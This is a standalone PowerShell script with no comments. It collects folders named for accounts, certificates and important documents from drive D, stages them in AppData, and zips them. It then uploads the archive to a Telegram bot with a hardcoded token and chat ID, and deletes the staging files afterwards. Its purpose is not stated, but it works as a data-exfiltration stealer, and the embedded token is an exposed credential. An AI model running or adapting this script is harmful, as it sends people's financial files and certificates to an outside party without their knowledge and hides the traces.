New-Item -Path "C:\Users\crism\AppData\Local\send" -ItemType Directory -Force

Copy-Item -Path "D:\CONTAS" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse
Copy-Item -Path "D:\Certificados" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse 
Copy-Item -Path "D:\Documentos Importantes" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse

Compress-Archive -Path "C:\Users\crism\AppData\Local\send" -DestinationPath "C:\Users\crism\AppData\Local\send.zip" -Force

$zipPath = "C:\Users\crism\AppData\Local\send.zip"
$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId  = "5757392163"

$url = "https://api.telegram.org/bot$token/sendDocument"

$boundary = [System.Guid]::NewGuid().ToString()
$crlf = "`r`n"


$fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
$fileName = [System.IO.Path]::GetFileName($zipPath)


$stream = New-Object System.IO.MemoryStream


function Write-String([System.IO.MemoryStream]$s, [string]$text) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
    $s.Write($bytes, 0, $bytes.Length)
}


Write-String $stream "--$boundary$crlf"
Write-String $stream "Content-Disposition: form-data; name=`"chat_id`"$crlf$crlf"
Write-String $stream "$chatId$crlf"


Write-String $stream "--$boundary$crlf"
Write-String $stream "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$crlf"
Write-String $stream "Content-Type: application/octet-stream$crlf$crlf"

$stream.Write($fileBytes, 0, $fileBytes.Length)
Write-String $stream $crlf


Write-String $stream "--$boundary--$crlf"


$stream.Position = 0


$request = [System.Net.WebRequest]::Create($url)
$request.Method = "POST"
$request.ContentType = "multipart/form-data; boundary=$boundary"
$request.ContentLength = $stream.Length


$reqStream = $request.GetRequestStream()
$stream.CopyTo($reqStream)
$reqStream.Close()


$response = $request.GetResponse()
$reader = New-Object System.IO.StreamReader($response.GetResponseStream())
$result = $reader.ReadToEnd()
$reader.Close()
$response.Close()

Remove-Item "C:\Users\crism\AppData\Local\send" -Recurse -Force
Remove-Item "C:\Users\crism\AppData\Local\send.zip" -Force
exit